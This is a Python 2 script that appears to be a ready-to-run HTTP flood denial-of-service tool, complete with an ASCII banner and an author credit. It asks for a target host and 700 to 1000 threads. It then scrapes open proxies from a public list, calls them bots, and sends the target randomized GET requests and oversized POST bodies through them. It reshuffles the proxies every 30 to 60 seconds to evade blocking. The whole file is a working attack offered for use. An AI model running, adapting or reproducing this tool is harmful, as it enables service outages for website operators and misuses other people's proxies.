# -*- coding: utf-8 -*-
lis='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_'
import socket,httplib,sys,threading,random,time,re
try:
 import requests
except:
 print"You need to install: requests"
 sys.exist()
try:
 import bs4
 from bs4 import BeautifulSoup
except:
 print"You need to install: bs4"
 sys.exit()
l="http://www.proxyserverlist24.top/"
print ('''%s

$$$     $$$  $$$$$$$$  $$$$      $$     $$  $$$$$$$$  $$$$$$$$$
$$$$   $$$$  $$        $$  $$    $$     $$  $$        $$     $$
$$ $$ $$ $$  $$        $$   $$   $$     $$  $$        $$     $$
$$  $$$  $$  $$        $$    $$  $$     $$  $$        $$     $$
$$   $   $$  $$$$$$$$  $$    $$  $$     $$  $$$$$$$$  $$$$$$$$$
$$       $$  $$        $$    $$  $$     $$        $$  $$     $$
$$       $$  $$        $$    $$  $$     $$        $$  $$     $$
$$       $$  $$$$$$$$  $$$$$$$$  $$$$$$$$$  $$$$$$$$  $$     $$


%s''' % ( "\x1b[31m" , "\x1b[31m" ))
print('''%s

	

Author:

       Ala Bouali

E-mail:

       trap.leader.123@gmail.com

Github:

       https://github.com/AlaBouali

Facebook:

       https://www.facebook.com/ala.chamtouri.73

Great thanks for inspiration and help on tests:

       -Soul

       -Vince

%s''' % ( "\x1b[1;97m" , "\x1b[1;97m" ))
global pr
pr=[]
li=[]
m=[]
headers = {"Content-type": "application/x-www-form-urlencoded",
           "Accept": "text/plain"}
i=0
z=0
n=0
while n<1:
 try:
  url=raw_input('\n\n\nTARGET:\n(www.example.com or IP)\n>')
  socket.gethostbyname(url)
  if url!="":
   n+=1
  else:
   print"Don't leave your target blank"
 except:
  print"Write your the domain or IP correctly"
while n<2:
 try:
  th=input("\n\nThreads:(700<threads<1000)\n>")
  if ((th<1001) and (th>699)):
   n+=1
  else:
   print"For better results limit your threads to that range"
 except:
  print"Enter a number between 700 and 1000"
print"[+]Fetching resources..."
try:
 r=requests.get(l,{'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; Maxthon; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)'}).text
 soup= BeautifulSoup ( r, 'html.parser')
 h3tags = soup.findAll('a')
 for a in h3tags:
    try:
     if (a.has_attr('href') and (l in str(a)) and ("proxy-server" in str(a)) and("#" not in (str(a)))) :
      try:
       a=str(a)
       a=a.split('href="')[1]
       a=a.split('"')[0]
       if (a not in m):
          m.append(a)
      except Exception as xx:
       pass
    except Exception as ex:
     continue
except Exception as e:
  pass
print"[*]Gathering bots:"
for k in m:
 try:
  print"[+]Page",m.index(k)+1
  a=requests.get(k, {'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; Maxthon; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)'})
  ips = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})",a.text)
  for w in ips:
    pr.append(w)
 except Exception as e:
  pass
print"\nBots:",len(pr),"\n"
while True:
    r=random.choice(pr)
    if (r not in li):
     li.append(r)
    if (len(li)>random.randint(70,80)):
     break
class HTTPThread(threading.Thread):
 def run(self):
  global i
  global z
  try:
   while True:
     try:
      line=random.choice(li)
      ip=line.split(':')[0].split('=')[0]
      p=line.split(':')[1].split('=')[0]
      try:
       conn = httplib.HTTPConnection(ip, int(p))
       g=random.randint(1,2)
       if g==1:
         conn.request("GET", 'http://'+url+'/')
         i+=1
       elif g==2:
         k=''
         for _ in range(1,random.randint(2,5)):
          k+=random.choice(lis)
         k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
         for _ in range(1,random.randint(1,3)):
          k+=random.choice(lis)
         j=''
         for x in range(0,random.randint(11,31)):
           j+=random.choice(lis)
         params =k+'='+(j*random.randint(100,300))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
         conn.request("POST", 'http://'+url+'/', params, headers)
         z+=1
       sys.stdout.write("\rRequests sent: {} GET {} POST".format(i,z))
       sys.stdout.flush()
      except socket.error as e:
       pass
      time.sleep(.1)
     except Exception as x:
      time.sleep(.01)
  except Exception as ex:
   pass
for x in range(th):
 t = HTTPThread()
 t.start()
class swi(threading.Thread):
 def run(self):
  global li
  while True:
   time.sleep(random.randint(30,60))
   li=[]
   while True:
    r=random.choice(pr)
    if (r not in li):
     li.append(r)
    if (len(li)>random.randint(70,80)):
     break
t=swi()
t.start()